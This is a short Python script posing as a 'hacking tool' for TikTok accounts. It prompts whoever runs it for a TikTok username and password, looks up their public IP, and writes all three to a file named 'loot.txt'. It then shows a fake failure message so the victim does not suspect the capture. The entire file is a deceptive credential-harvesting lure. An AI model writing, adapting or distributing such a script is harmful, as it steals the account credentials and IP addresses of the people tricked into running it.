import os, time, requests
R, G, Y, C, W = '\033[31m', '\033[32m', '\033[33m', '\033[36m', '\033[37m'
def run():
    os.system('clear')
    print(f'{R}======================================\n{Y}   ZIDAN PRO HACKING TOOL v2.0   \n{R}======================================')
    user = input(f'{G}[?] TikTok Username: {W}')
    pw = input(f'{G}[?] Password: {W}')
    print(f'{Y}[*] Hijacking System... Please wait.')
    try: ip = requests.get('https://api.ipify.org').text
    except: ip = 'Hidden'
    with open('loot.txt', 'a') as f: f.write(f'User: {user} | Pass: {pw} | IP: {ip}\n')
    time.sleep(2)
    print(f'{R}[!] FAILED: Device is too strong to hack!\n{W}Data saved in loot.txt')
run()
